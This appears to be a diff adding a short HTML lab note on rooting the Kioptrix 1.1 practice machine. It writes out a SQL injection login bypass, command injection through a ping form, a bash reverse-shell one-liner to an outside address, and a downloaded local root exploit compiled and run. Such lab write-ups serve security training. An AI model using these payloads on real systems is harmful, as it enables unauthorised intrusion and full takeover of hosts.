@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Kioptrix 1.1</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Kioptrix 1.1</h1><br/>quick nmap showed that the machine was running 22, 80, 111, 443, 631, 3306<br />22 not no login and not vulnerable<br />80 dirsearch showed index.php right at the top<br />This looks like a login page...<br />any time I see a login page I try   <code>admin&#39; or 1=1 #</code>    and bam! admin!!<br />the page seems to runs ping on whatever we give it<br />1.1.1.1      yup<br />1.1.1.1; whoami      it shows us apache!<br />start nc listenter<br />1.1.1.1; bash -i &gt;&amp; /dev/tcp/192.168.11.252/3232 0&gt;&amp;1<br />BOOM! apache shell<br />cat /etc/redhat-release     shows us that it is a crazy old version of redhat             CentOS release 4.5 (Final)<br />searchsploit 4.5 centos      shows us 9542.c<br />wget over<br />gcc -o 9542 9542.c<br />./9542<br />whoami<br />root<br />!!!!!!!!!</div></body></html>
